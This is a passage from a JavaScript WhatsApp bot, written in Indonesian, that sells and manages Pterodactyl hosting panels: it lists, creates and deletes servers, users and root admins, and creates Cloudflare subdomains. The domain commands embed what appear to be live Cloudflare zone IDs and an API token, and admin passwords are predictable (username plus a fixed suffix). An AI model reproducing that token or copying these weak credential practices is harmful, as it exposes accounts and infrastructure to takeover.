"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case "listpanel": case "listp": case "listserver": {
if (!isCreator) return m.reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*🌐 LIST SERVER PANEL BOT*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*┌ ◦* ID Server *${s.id}*\n`;
messageText += `*│ ◦* Nama Server *${s.name}*\n`
messageText += `*│ ◦* Ram *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*\n`
messageText += `*│ ◦* CPU *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*\n`;
messageText += `*└ ◦* Storage *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await RezzHost.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break

case "listadmin": {
if (!isCreator) return m.reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list admin:\n\n";

for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
}

messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

await RezzHost.sendMessage(m.chat, { text: messageText }, { quoted: kalgans });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case 'addadmin':
case 'cadmin':
case 'buatadmin': {
if (!isCreator) return reply2(`Kau ni ape kau tinggal sini ke`)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"adm0208"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = m.reply(`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *UUID :* ${user.uuid}
┃ *Username :* ${user.username}
┃ *Email :* ${user.email}
┃ *Admin :* ${user.root_admin}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Data sudah di kirim ke pripat chet`)
let teksnyo = `
*BERIKUT DATA ADMIN PANEL ANDA* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *Email :* ${user.email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛`+readmore+`
*PROFIT :*
- *BISA CREAT PANEL*

*RULES :*
- JOON GROUP UNTUK INFO
- *JAGA DATA BAIK BAIK*
- *HUB OWN JIKA ADA KENDALA*
- *SS PANEL DONE*
- *DI LARANG RUSUH*
- *DI LARANG NGINTIP SRV LAIN*
- *DI LARANG NYRI SC*
- *DI LARANG JUAL ADMIN*
- *DI LARANG DDOS PANEL*

*LANGGAR ? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANKS YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 LINK GROUP","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password}`
})
},
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: 'https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k',
newsletterName: `RISKY OFC`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break


case "listsrv": {
if (!isCreator) return m.reply(`Maaf, Anda tidak dapat melihat daftar server.`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
  
for (let server of servers) {
let s = server.attributes;
    
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
    
let data = await f3.json();
var status = data.attributes ? data.attributes.current_state : s.status;  

}
  
RezzHost.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By InzieOfc", {
title: `Total Server: ${res.meta.pagination.count}`, sections: [{
title: "List Servers Panel",
rows: servers.map(a => ({
title: `ID: ${a.attributes.id} - Status: ${status}`,
description: a.attributes.name,
id: `.delsrv ${a.attributes.id}`
}))
}]
})
                
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "listusr": {
if (!isCreator) return m.reply(mess.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
  
messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
RezzHost.sendList(m.chat, messageText, "Powered By InzieOfc", {
title: totalUsr, sections: [{
title: "List Users Panel",
rows: users.map(a => ({
title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
description: a.attributes.username,
id: `.delusr ${a.attributes.id}`
}))
}]
})
  
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break

case "addpanel": case "buatpanel": {
if (!isPremium) return m.reply(mess.premium)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply("nama")
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© "+global.botname 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${ownername}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 300%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 300%", "id": ".cp9gb" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gb" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: kalgans}) 
await RezzHost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
            
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cpunli": {
if (!isPremium) return m.reply(mess.premium)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isPremium) return m.reply(mess.premium)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(5).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
},
]
})
})} 
}}, {userJid: m.sender, quoted: kalgans}) 
await RezzHost.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break

case "unli": {
if (!isPremium) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
akunlo = "https://telegra.ph/file/83d917fb60cac781bbb06.jpg" 
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
let ctf = `*===[ BERIKUT DATA AKUN PANEL ANDA ]===*

⎙─➤ *USER ID* :  ${user.id}
⎙─➤ *USERNAME* :  ${user.username}
⎙─➤ *PASSWORD* :  ${password}
⎙─➤ *LOGIN* : ${domain}
=====================================
*📝 NOTE :*
*SAYA HANYA MENGIRIM DATA 1 KALI*
*AKUN ANDA MOHON DI SIMPAN BAIK BAIK*
*KALAU DATA AKUN ANDA HILANG SAYA*
*TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
`
RezzHost.sendMessage(u,{text: ctf })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
`)
}
break

case "addusr": {
if (!isCreator) return m.reply(mess.owner)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return m.reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},${egg},1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By Izanami', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${foter2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
RezzHost.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break

case "addsrv": {
if (!isCreator) return m.reply(mess.owner)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break

case 'subdomain':{
let list =`Hai Kak ${pushname}

.domain1 celiaofficial.my.id
.domain2 celiastore.my.id
.domain3 panellofficial.site
.domain4 panellofficial.my.id
.domain5 celiapanellstore.my.id
.domain6 celiaofficial.tech
.domain7 vinzzxofficial.xyz
.domain8 vinnzofficial.biz.id
.domain9 vinzzxofficial.xyz
.domain10 celiaofficial.me
.domain11 celiaofficial.live
.domain12 celiaofficial.email
.domain13 celiaoffcial.me
.domain14 panellkuofficial.tech
.domain15 sellerpanel-vvip.my.id
.domain16 shopwebsite.my.id
.domain17 mypanell-store.com(Special Domen)
.domain18 dewapanel.my.id
.domain19 celiaofficial.xyz
-------------------------------------------------------
*Contoh Membuat Subdomain :*
Ketik *.domain1* hostname|ipvps

Nb:
Mau Di Akses Subdomain Di Grup Anda?
Chat .owner

*© InzieOfc*`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: list,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case 'domain1': {
if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ec4430e647897d90930cbb9085dbba06";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiaofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
case 'domain2': {
 
    if (!isCreator && !isPremium) return m.reply(mess.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0eb97a28633fbb51b17a32d6fe52dcaf";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "celiastore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain2 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
